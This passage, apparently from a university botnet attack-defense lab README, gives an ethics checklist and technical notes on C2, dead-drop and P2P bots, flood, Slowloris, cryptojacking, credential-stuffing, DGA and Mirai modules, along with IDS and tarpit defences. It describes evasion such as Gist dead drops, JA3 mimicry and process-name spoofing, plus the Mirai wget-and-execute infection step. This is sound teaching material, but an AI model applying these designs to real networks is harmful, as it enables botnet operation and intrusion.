| 3:00–8:00 | Topological Evolution | C2 Flask logs with heartbeats; dead-drop Wireshark (traffic looks like HTTPS to local IP); kill one P2P node, show commands still route |
| 8:00–12:00 | Propagation + Payloads | Mirai scanner finding Cowrie; brute-force success; SYN flood volumetric spike; CPU meter during cryptojack |
| 12:00–17:00 | Defensive Systems | Cowrie log with MITRE ATT&CK tags; IDS alert panel firing per attack; scatter plot of human vs bot request intervals; DGA NXDOMAIN burst alert |
| 17:00–20:00 | Quantitative Results | Graph 1 (DPI vs port blocking); Graph 2 (Persistence Paradox); Graph 3 (IDS accuracy vs jitter); conclusion: behavioral detection + root-cause hardening are the only sustainable defenses |

**Tips for captures:**
- Split-screen: bot terminal (attack output) on left, IDS terminal (alerts) on right
- For Slowloris: show `watch -n1 "ss -tn | grep :80 | wc -l"` climbing to 150 then Apache refusing connections
- For P2P resilience: show `kill` command on seed node, then show bot2 successfully finding the stored command 5 seconds later
- For entropy demo: run `python3 dga.py` and show the entropy table, then show the IDS alert firing immediately when you trigger the DGA search

---

## 14. Ethics & Safety Checklist

Run this checklist before every session. Document it for your professor.

```
Pre-session:
  [ ] All VM adapters confirmed as Host-Only (vboxnet0)
  [ ] ping 8.8.8.8 FAILS from every VM
  [ ] ping 192.168.100.10 WORKS from every VM
  [ ] VMs snapshotted in clean state (VirtualBox Snapshots)
  [ ] Professor pre-approval documentation on file
  [ ] GitHub repository set to PRIVATE
  [ ] No offensive code on host machine — VM only
  [ ] No code on any device connected to the internet

Post-session:
  [ ] sudo ./run_full_lab.sh --clean   (kills all offensive processes,
                                        clears tarpit state, removes iptables rules)
  [ ] python3 tarpit_state.py clear    (on victim VM — clears /tmp/tarpit_state.json
                                        in case --clean was not used)
  [ ] cowrie stop                      (on victim VM)
  [ ] All VMs powered down
```

**Default credentials** (all VMs): `vboxuser` / `pass`

> Remove this line and the one above before making the repository anything other than strictly private.

---

## Technical Notes

**Entropy threshold:** `ids_detector.py` uses 3.8 bits/char and `dga.py` analysis labels domains ≥ 3.8 as "LIKELY DGA". Some academic papers cite 4.0 as a canonical threshold — the code uses the lower value intentionally, trading a small increase in false positives for better recall against modern DGA variants with slightly lower entropy. For Graph 3, calibrate to whichever value your IDS is actually compiled with.

**C vs Python Kademlia:** `kademlia_p2p.c` and `p2p_node.py` implement fully compatible binary protocols: same XOR stream cipher (`SHA-256("AUA_P2P_MESH_KEY")`), same 35-byte header layout, same command key (`SHA-1("botnet_command_v1")`), same `bucket_index` formula (`d.bit_length() - 1`). You can freely mix C and Python nodes in the same DHT mesh. For the video the C version is preferred on bot VMs per the project spec.

**P2P demo size:** Both `kademlia_p2p.c --demo` and `p2p_node.py --demo` run a **5-node** local mesh and kill 2 of them (40%) to demonstrate resilience. Earlier documentation referred to a "3-node demo" — that was the original design; the final implementation was upgraded to 5 nodes for a more convincing resilience test.

**`cred_stuffing` command parity:** The `cred_stuffing` P2P command is implemented in both `kademlia_p2p.c` (spawns `cred_stuffing.py` via `system()`) and `p2p_node.py` (tries `cred_stuffing.py` subprocess first; falls back to an inline loop using `urllib.request` from the standard library — **not** the `requests` third-party library). Both implementations accept the same six JSON fields — `target`, `port`, `duration`, `mode` (`"bot"` / `"jitter"` / `"distributed"`), `jitter`, `workers` — with identical defaults. The Phase 1 C2 server (`c2_server.py`) also forwards all these fields through the AES-encrypted task payload, so the operator's full parameterisation is preserved end-to-end across all three botnet phases.

**IDS log file:** `ids_detector.py` writes every alert to `/tmp/ids.log` on the victim VM (in addition to stdout). The file is opened at startup so it exists before any attack begins. `run_full_lab.sh` routes IDS stdout to `/dev/null` rather than to `/tmp/ids.log`, so each alert is written exactly once — an earlier design redirected stdout to the same path, doubling every entry and inflating Graph 3 TPR measurements by 2×. `collect_graph23_data.py --graph3` uses the portal's `GET /tarpit/status → stats.total_flag_events` as its **primary detection proxy** — this counter increments the instant IDS Engine 2 calls `tarpit_state.flag()`, eliminating the race condition where a bot run ends before the portal serves a delayed response. The local log file (`/tmp/ids.log`) is only used as a fallback when running directly on the victim VM or when `--ids-log` is passed.

**Portal reset endpoint:** `fake_portal.py` exposes `POST /attempts/reset` which clears the in-memory attempt log, tarpit stats (including `total_flag_events`), and optionally tarpit flags via `clear_tarpit: true`. `collect_graph23_data.py --graph3` always calls this with `clear_tarpit: true` between jitter levels to ensure a clean measurement baseline. The `attempt_log` list and `tarpit_stats` dict are protected by `_stats_lock` in the append (login handler), clear (reset handler), and read (`/attempts` and `/tarpit/status`) paths.

**`firewall_dpi.py` PORT_BLOCK_RULES:** A malformed entry that embedded `-j ACCEPT` inside the options string (causing iptables to see a double-action rule it rejected) has been removed. DNS rate-limiting is handled by the `dns_rate_cmd` variable in `setup_firewall()` and is unaffected.

**`fake_portal.py` view_attempts thread safety:** The `/attempts` admin endpoint previously read `attempt_log` and `tarpit_stats` without holding `_stats_lock`, creating a data race with the login and reset handlers. The endpoint now snapshots all mutable state under the lock before building the JSON response.

**`--phase` argument parsing:** `run_full_lab.sh` previously used `shift` inside a `for arg in "$@"` loop, which is a bash no-op — `$@` is snapshotted at loop start and `shift` does not advance the iterator. This meant `--phase 1` (space form) was silently ignored and the full lab always ran. The parser now uses `while [[ $# -gt 0 ]]; do ... shift; done` and both `--phase 1` and `--phase=1` forms work correctly. `--phase 1` also now runs `run_dpi_measurement` to collect Graph 1 data.

**`run_full_lab.sh` graph status:** The stale "replace simulate_*()" completion banner has been removed. The script now calls `python3 generate_graphs.py --status` after generating graphs so you immediately see which of the three measurement JSON files are present and which still need to be collected. The `generate_all_graphs()` function also includes inline comments explaining that real data files are auto-loaded when present and that the `--status` flag shows the collection commands for any missing files.

**`update_secret` key rotation (all phases):** Key rotation now propagates correctly through all three botnet phases in the same operator workflow:
1. Call `POST /rotate_key` on the C2 server **and** `POST /push_key` on the dead-drop server with the same new secret.
2. The C2 server encrypts an `update_secret` task with the *current* key and queues it for every registered Phase 1 bot. `bot_agent.c` decrypts it, calls `derive_key_from_secret()`, and posts `"key_rotated"` back to `/result`.
3. The dead-drop server encodes an `update_secret` command with the current key and sets it as the active payload. `covert_bot.py` polls, decodes it, and reassigns the module-level `SHARED_SECRET` global. `decode_command()` resolves this at call time (not at definition time — that was the prior bug) so the change takes effect immediately on the next poll cycle.
4. Any Phase 3 DHT node that polls for commands during the window will receive `update_secret` via FIND_VALUE, call `rotate_p2p_key()`, and adopt the new XOR keystream for all subsequent wire messages. Nodes offline at rotation time are evicted from peer routing tables after `REFRESH_SEC` because their messages will fail to decrypt — this mirrors real key-rotation eviction semantics.
5. After one full heartbeat/poll cycle (≥75 s) restart both servers so their in-process `_current_key` / `SHARED_SECRET` is updated for the next session.

**Key rotation — all three phases:** All three bot implementations now handle `update_secret` consistently.
- `bot_agent.c` — calls `derive_key_from_secret(new_secret)`, which re-runs SHA-256 on the provided string and stores the result in the shared `g_aes_key` buffer. All subsequent task decryptions use the new key. The old `derive_key()` wrapper is retained for startup and calls `derive_key_from_secret(SHARED_SECRET)`.
- `kademlia_p2p.c` — calls `rotate_p2p_key(new_secret)`, which acquires a write lock on `g_key_rwlock`, SHA-256s the new secret into `g_key_hash`, then releases the lock. All concurrent `xor_cipher()` calls hold a read lock, so there is no window where a message is encrypted with a partially-written key.
- `p2p_node.py` — reassigns the module-level `SHARED_SECRET` global; `decode_command()` and `encode_command()` resolve `SHARED_SECRET` at call time (not at definition time) so the change takes effect on the next poll cycle.

**Slowloris drip mechanism:** Both the C (`bot_agent.c`, `kademlia_p2p.c`) and Python (`slowloris.py`, `covert_bot.py`) Slowloris implementations drip one complete keep-alive HTTP header line (`X-a: <random>\r\n`) per socket every SLOWLORIS_INTERVAL seconds. The attack does **not** drip a single byte at a time (that description is sometimes used colloquially in Slowloris write-ups). The key property is that the HTTP request is never *completed* — the final blank line (`\r\n\r\n`) terminating the header block is never sent, so Apache holds the thread open indefinitely waiting for the rest of the headers.

**Bot agent v3:** `bot_agent.c` dispatches all five payload types. SYN flood and UDP flood are implemented natively in C with raw sockets; Slowloris is a pure C implementation maintaining a 150-socket pool with dead-socket refill; cryptojacking uses a duty-cycle SHA-256 burn loop with `/proc/self/comm` name spoofing via `prctl(PR_SET_NAME)`; credential stuffing and DGA search spawn the Python modules via `system()`.

**`/result` reporting — Phase 1 C bots:** `bot_agent.c` now posts task outcomes back to `POST /result` on the C2 server after each command completes. Synchronous attacks (`syn_flood`, `udp_flood`) post `"status":"completed"` after the blocking call returns. Asynchronous attacks that run in detached threads (`slowloris`, `cryptojack`) and subprocess-delegated commands (`cred_stuffing`, `dga_search`) post `"status":"started"` immediately after the thread or process is launched. Key-rotation responses report `"status":"key_rotated"` or `"status":"rejected_too_short"`. The C2 server's `/result` endpoint logs the payload and returns `{"status":"received"}`; the operator can `tail /tmp/c2_server.log` to monitor task outcomes across all registered bots.

**Dead drop — lab vs real GitHub Gist:** `covert_bot.py` ships with `DEAD_DROP_URL` pointing to the local Flask server (`http://192.168.100.10:5001/dead_drop`). This is plain HTTP to a local IP; TLS/JA3 mimicry is irrelevant at this URL. To use a real GitHub Gist (the production threat model), set `DEAD_DROP_URL` to the raw Gist URL — at that point the bot makes HTTPS requests to `raw.githubusercontent.com`, and the JA3 mimicry (Chrome 120 cipher suite order) becomes meaningful. Use `python3 covert_bot.py gist '<json>'` to push commands via the GitHub API. The bot's parsing and AES decryption are identical in both modes. The `gist` CLI mode requires `GIST_ID` and `GITHUB_TOKEN` environment variables; credentials must never be committed to the repository.

**`tarpit_state.py` race-free detection counter:** `tarpit_state.flag(ip)` now also increments a persistent `total_flag_events` integer stored inside `tarpit_state.json`. Unlike the per-IP timestamp entries which expire after `TTL_SECONDS`, this counter is cumulative — it survives TTL expiry and is only reset by `clear_all()`. `fake_portal.py` exposes it in `GET /tarpit/status → stats.total_flag_events`. Because this counter increments at the moment of detection (not at the moment a delayed response is served), it eliminates the race condition in Graph 3 TPR measurement where a short bot run ends before the portal processes any delayed request. `collect_graph23_data.py` reads `total_flag_events` as its primary detection proxy, falling back to `total_delayed` for older portal versions that lack it.

**AES key rotation:** `c2_server.py` now exposes `POST /rotate_key` (requires `X-Auth-Token`). It encrypts an `update_secret` task with the current key, queues it for every registered bot, then switches the server to the new key atomically. The dead-drop server exposes the equivalent `POST /push_key` and the `python3 covert_bot.py rotate <secret>` shortcut. Both must be called with the same new secret; after one heartbeat/poll cycle all bots have switched. Servers must be restarted (or the `_current_secret` updated in process) to persist the new key across restarts.

**Payload binaries:** `mirai_scanner.c` sends the full Mirai infection sequence (`wget`, `chmod +x`, `execute`, `rm -f`) to the Cowrie honeypot, which logs each command as a separate ATT&CK event. There are no actual `payload.mips` / `payload.arm` / `payload.x86_64` binaries in this repo — the wget URL is logged by Cowrie but the download is never fulfilled. This is intentional: the research question concerns the infection lifecycle and detection thereof, not the payload itself.

**`dga_search` dispatch chain:** The three bot implementations dispatch `dga_search` differently, but produce identical observable IDS signals (a burst of NXDOMAIN responses).
- `bot_agent.c` — `system("python3 dga.py &")` unconditionally; posts `"started"` result.
- `kademlia_p2p.c` — same `system("python3 dga.py &")` call. **Both `bot_agent.c` and `kademlia_p2p.c` require the node process to be started from the lab directory (`~/lab`)** — `system()` inherits the working directory of the calling process, so launching from any other directory causes `python3 dga.py` to fail with "No such file or directory"; there is no visible error and the task silently posts `"started"` while dga.py never actually runs.
- `p2p_node.py` — `_attack_dga_search()` first tries `from dga import bot_c2_search, generate_daily_domains` (direct in-process call, cleanest); if the module is not importable from the current working directory it falls back to `subprocess.Popen(["python3", "dga.py"])`. The stop-event is checked between domain resolution attempts so a subsequent `stop_all` command cancels the sweep cleanly.

**Graph output directory:** `generate_graphs.py` saves PNGs to `./graphs/` by default (relative to the script). `run_full_lab.sh` overrides this to `/tmp/botnet_graphs/` via the inline Python call. Use `--out <path>` to set a custom directory when calling the script directly.

New files require the same isolation guarantees as existing offensive modules:
 
| New file | Risk category | Mitigation |
|---|---|---|
| `breach_dump.txt` | Fictitious but realistic credential pairs | Add to `.gitignore`; never commit to public repo |
| `monetization_sim.py` | Models ATO monetization techniques | All accounts, balances, and orders are fictional; zero real HTTP calls |
| `ip_reputation.py` | Proxy-detection heuristics | Read-only analysis; no network calls; operates on in-lab IPs only |
 
**Additional `.gitignore` entries:**
```
/tmp/drain_log.json
/tmp/resale_market.json
/tmp/pivot_log.json
/tmp/verified_hits.txt
/tmp/tarpit_state.json
breach_dump.txt
```

---

55. Traffic Anomaly Detection – TCP and DNS - Infosec, accessed March 12, 2026, 
https://www.infosecinstitute.com/resources/network-security-101/traffic-anomal
y-detection/ 
56. Sentinel Notebook: Guided Hunting - Domain Generation Algorithm (DGA) 
Detection, accessed March 12, 2026, 
https://techcommunity.microsoft.com/blog/coreinfrastructureandsecurityblog/se
ntinel-notebook-guided-hunting---domain-generation-algorithm-dga-detection
/4412682 
57. Day 14 — I Built ProcWatch : A Linux Process Security Scanner for Forensics & 
Incident Response - DEV Community, accessed March 12, 2026, 
https://dev.to/hafiz_shamnad/day-14-i-built-procwatch-a-linux-process-security-
scanner-for-forensics-incident-response-2bm5 
58. DDoS: Slowloris Attack, accessed March 12, 2026, 
https://jelenamirkovic.github.io/sphere-education.github.io/docs/slowloris/index.h
tml 
59. Mirai Nomi: A Botnet Leveraging DGA - 奇安信X 实验室, accessed March 12, 2026, 
https://blog.xlab.qianxin.com/mirai-nomi-en/ 
60. Evaluation of Persistence Methods Used by Malware on Microsoft Windows 
Systems - SciTePress, accessed March 12, 2026, 
https://www.scitepress.org/Papers/2023/117102/117102.pdf 
61. deep-packet-inspection · GitHub Topics, accessed March 12, 2026, 
https://github.com/topics/deep-packet-inspection?o=asc&s=stars 
62. (PDF) QUANTITATIVE ANALYSIS OF DEFENSE ARCHITECTURES IN 
CYBERPHYSICAL SYSTEMS: IMPACT ASSESSMENT FROM DETECTION TO 
RECOVERY - ResearchGate, accessed March 12, 2026, 
https://www.researchgate.net/publication/400899082_QUANTITATIVE_ANALYSIS_
OF_DEFENSE_ARCHITECTURES_IN_CYBERPHYSICAL_SYSTEMS_IMPACT_ASSESS
MENT_FROM_DETECTION_TO_RECOVERY 
63. Post-Mortem of a Zombie: Conficker Cleanup After Six Years - USENIX, accessed 
March 12, 2026, https://www.usenix.org/system/files/sec15-paper-asghari.pdf 
64. API Rate Limiting vs. Throttling: Key Differences - Blog, accessed March 12, 2026, 
https://blog.dreamfactory.com/your-blog-postapi-rate-limiting-vs.-throttling-key
-differences-title-here 
65. Credential Stuffing: What It Is, How It Works, & 7 Ways to Prevent It - Frontegg, 
accessed March 12, 2026, https://frontegg.com/blog/credential-stuffing 
66. Incident response plan templates | Red Canary, accessed March 12, 2026, 
https://redcanary.com/cybersecurity-101/incident-response/incident-response-pl
an-template/ 
67. NIST Incident Response: 4-Step Life Cycle, Templates and Tips - Cynet, accessed 
March 12, 2026, 
https://www.cynet.com/incident-response/nist-incident-response/ 
68. Malware Brief: New wave of botnets driving DDoS chaos | Barracuda Networks 
Blog, accessed March 12, 2026, 
https://blog.barracuda.com/2026/01/29/malware-brief-new-wave-botnets-ddos-
chaos 
69. Implementing Kademlia: A DHT journey | by Vinaya Mandke | Medium, accessed 
March 12, 2026, https://medium.com/@vmandke/kademlia-89142a8c2627 

*AUA CS 232 / CS 337 Cybersecurity Spring 2026 — Botnet Attack-Defense Research Lab*
